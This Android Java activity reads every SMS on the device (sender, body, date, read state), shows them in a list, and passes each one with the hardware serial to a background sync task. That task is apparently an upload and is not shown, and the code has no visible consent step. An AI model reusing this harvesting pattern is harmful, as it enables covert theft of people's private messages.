package com.codesndata.messages;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.codesndata.back_up.R;

import java.util.ArrayList;
import java.util.Date;


public class MainActivity extends Activity {
    ListView lViewSMS;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sms);

        lViewSMS = findViewById(R.id.listView);

        if(fetchSms()!=null)
        {
            ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, fetchSms());
            lViewSMS.setAdapter(adapter);
        }
    }

    public ArrayList<String> fetchSms()
    {
        ArrayList<String> sms = new ArrayList<>();

        Uri uriSms = Uri.parse("content://sms/");
        @SuppressLint("Recycle")
        Cursor cursor = getContentResolver().query(uriSms, new String[]
                {"_id", "address", "date", "body", "type", "read"},
                null,null,null);

        assert cursor != null;

            for (int i = 0; i < cursor.getCount(); i++) {
                while (cursor.moveToNext()) {
                String id = cursor.getString(0);
                String address = cursor.getString(1);
                String smsDate = cursor.getString(2);
                String date = String.valueOf(new Date(Long.valueOf(smsDate)));
                String body = cursor.getString(3);
                String type;
                if (cursor.getString(4).contains("1")) {
                    type = "Received";
                } else {
                    type = "Sent";
                }
                String readState;
                if (cursor.getString(5).contains("1")) {
                    readState = "Read";
                } else {
                    readState = "Unread";
                }

                System.out.println("==== Id ; " + id);
                System.out.println("==== Type ; " + type);
                System.out.println("==== Entity ; " + address);
                System.out.println("==== Date ; " + date);
                System.out.println("==== SMS Text ; " + body);
                System.out.println("==== Read State ; " + readState);

                @SuppressLint("HardwareIds") String serial = Build.SERIAL;
                BgSync sync = new BgSync();
                sync.execute(id, type, address, body, date, readState, serial);

                sms.add("\nId : " + id + "\nType : " + type + "\nEntity : " + address + "\nSMS : " + body + "\nDate : " + date + "\nRead State : " + readState + "\n\n");
            }
        }
        return sms;

    }
}